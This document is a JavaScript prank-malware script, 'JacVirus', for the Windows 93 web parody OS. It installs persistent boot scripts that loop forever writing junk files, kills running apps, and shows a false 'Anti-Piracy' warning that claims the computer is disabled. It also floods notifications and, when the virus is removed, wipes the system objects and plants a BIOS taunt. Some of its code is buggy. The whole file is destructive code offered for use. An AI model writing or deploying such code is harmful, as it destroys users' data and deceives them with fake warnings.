//Important!! Credits are at the bottom!


// Found this in the trollbox code. Thought it would be a good addition to this project.
le._dom.background.style.background = "#000";
$fs.utils.normalizeIcon=function(){return "/c/sys/skins/w93/apps/keygen.png"}, parent.$explorer.refresh();
$exe("killall")
function a() {
    $alert({
        title: 'Anti-Piracy',
        msg: '<b><p style="color:Red;">Anti-Piracy.</p></b> You are using a unactivated windows93. This may happen because you havent activated windows within the 108 hour time period. You can also use fake or malicious software that may "generate" product keys. You can also activate pirated software that can be bad for your computer. Your computer has been disabled. Buy a new computer with a new product key.\n\n\n\n Missing product key... (Error 428)',
        icon: '/c/sys/skins/w93/apps/keygen.png',
        img: '/c/sys/skins/w93/apps/keygen.png',
        btnOk: 'OK',
        btnCancel: '',
        onok: function(){
        }
      });
}
setTimeout(function(){ a(); }, 3000); 

$db.set("boot/clog.js",'while(true){$file.save("/a/boot/bruh.lnk42", "js base64");}')
$db.set("boot/clog2.js",'while(true){$file.save("/a/desktop", "GARBAGE" + Math.random + `>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<`);}')


var randomNumber = Math.floor(Math.random() * 1000);
var randomNumber2 = Math.floor(Math.random() * 1000);
// Detects if someone is trying to remove the virus
function terminate (codehjghjhjg){
  if (codehjghjhjg === 0){
    // 0 - /boot/JacVirus.js was removed
    $alert.error("Anti-Piracy Code: "+codehjghjhjg)
    Object.keys(le).forEach($k=>delete le[$k]);
    system42=null;
    system42.data._settings.skin=null;
    window.location.assign("/404");
  }
  if (codehjghjhjg === 1){
    // 1 - bruh.lnk42 gets removed.
    $alert.error("JacVirus will now terminate the system. Terminate Code: "+codehjghjhjg)
    var i;
    for (let step = 0; step < 10; step++) {
     $file.save("/a/boot/bruh.lnk42", "js base64");
     $file.save("/a/boot/bruh.lnk42", "js base64"); // clog it all up
     } 
     Object.keys(le).forEach($k=>delete le[$k]);
     system42=null;
    system42.data._settings.skin=null;
    window.location.assign("/404"); // redirect them to a 404 screen
  }
  if (codehjghjhjg == 2){
    // 2 - Random chance, if the virus feels like it should do it. 
    $alert.error("JacVirus will now terminate the system. Terminate Code: "+codehjghjhjg)
    Object.keys(le).forEach($k=>delete le[$k]);
    system42=null;
    system42.data._settings.skin=null;
    window.location.assign("/404");
  }
  if (codehjghjhjg == 3){
    // 3 - If the user somehow survives the virus, terminate the system.
    $alert.error("JacVirus will now terminate the system. Terminate Code: "+codehjghjhjg) // display another error bo
    for (let step = 0; step < 10; step++) {
      $file.save("/a/boot/bruh.lnk42", "js base64");
      $file.save("/a/boot/bruh.lnk42", "js base64"); // clog it all up
      } 
      $db.set("boot/youTried.js","window.location.hash=\"#\";biosSetup();$boot.BIOS.innerHTML=\"<b> Your pc is trashed by the JACVIRUS. Don't try to remove this virus in safe mode. because safe mode is trashed too. </b> <img src=\\\"//\\\" style=\\\"position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);\\\"><audio src=\\\"https://cdn.discordapp.com/attachments/612814030515470363/786017967146139668/Hacknet_Labyrinths_OST_HOME_-_Dreamhead.mp3\\\" autoplay=\\\"\\\" loop=\\\"\\\"></audio>\""); // drop the messagex
    Object.keys(le).forEach($k=>delete le[$k]);
    system42=null;
    system42.data._settings.skin=null;
    window.location.assign("/404");
  }
  if (codehjghjhjg == 2){
    // 2 - Random chance, if the virus feels like it should do it. 
    $alert.error("JacVirus will now terminate the system. Terminate Code: "+codehjghjhjg)
    Object.keys(le).forEach($k=>delete le[$k]);
    system42=null;
    system42.data._settings.skin=null;
    window.location.assign("/404");
  }
}

setInterval(function () {
  if (!localStorage["boot/JacVirus.js"]) {
      terminate(0)
    }
  if (!localStorage["bruh.lnk42"]) {
      terminate(1)
  }
  if (randomNumber == randomNumber2){
      terminate(2)
  }
  if (smart == 1){
     terminate(3)
  }
}, 1000);

setTimeout(function(){ a(); }, 3000); 

parent.$explorer.refresh();
parent.$explorer.refresh();
parent.$explorer.refresh();
parent.$explorer.refresh();
parent.$explorer.refresh();

setInterval(function() {
$notif('Piracy Detected!', 'Piracy has been detected on this computer. SHUT DOWN THE COMPUTER NOW!')
}, 200000);

setInterval(function() {
$notif('PIRACY DETECTED!')
}, 50);
/*/
Credits to GlitchyZoura for the first and original Anti-Piracy
This is his Anti-Piracy
https://github.com/GlitchyZorua/windows93-code-archive/blob/main/Win9Arc/Scripts/Apps/93piracy.js
/*/
